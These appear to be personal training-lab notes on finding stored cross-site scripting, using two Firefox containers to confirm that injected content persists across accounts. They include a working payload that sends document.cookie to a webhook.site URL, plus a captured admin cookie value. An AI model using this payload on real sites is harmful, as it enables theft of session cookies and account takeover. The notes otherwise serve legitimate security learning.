XSS Stored

Thursday, October 19, 2023

9:15 PM

 

<https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/>

Add to Firefox

 

Set up and name containers as many as you need

 

Visit our lab in the 2 new containers

![](012_XSS_Stored_000.png){width="5.177083333333333in" height="1.9270833333333333in"}

Can login with different accounts

 

Testing for HTML Injection

![](012_XSS_Stored_001.png){width="2.84375in" height="1.1875in"}

And we have it

![](012_XSS_Stored_002.png){width="3.6666666666666665in" height="1.5833333333333333in"}

 

This was on container 1. If we go over to container 2 and refresh and see test also we know we have stored xxs. In our case we do.

 

Second test

![](012_XSS_Stored_003.png){width="2.7916666666666665in" height="1.1145833333333333in"}

 

![](012_XSS_Stored_004.png){width="5.552083333333333in" height="2.0625in"}

 

Quick refresh on container 2 shows us we have stored

![](012_XSS_Stored_005.png){width="6.34375in" height="6.875in"}

 

 

Webhook.site can be useful for grabbing things like admin cookies

[Using Cross Site Scripting (XSS) to Steal Cookies \| Infinite Logins](https://infinitelogins.com/2020/10/13/using-cross-site-scripting-xss-to-steal-cookies/)

 

Payload for challenge

\<script\>var i =new Image;i.src=\"https://webhook.site/3a0b3524-a0d1-4a6c-ad05-d2bd02714b9f/?\"+document.cookie;\</script\>

 

Admin cookie

![](012_XSS_Stored_006.png){width="14.604166666666666in" height="4.53125in"}

5ac5355b84894ede056ab81b324c4675

 

In admin console we can type document.cookie to verify or also look in storage of dev tools.
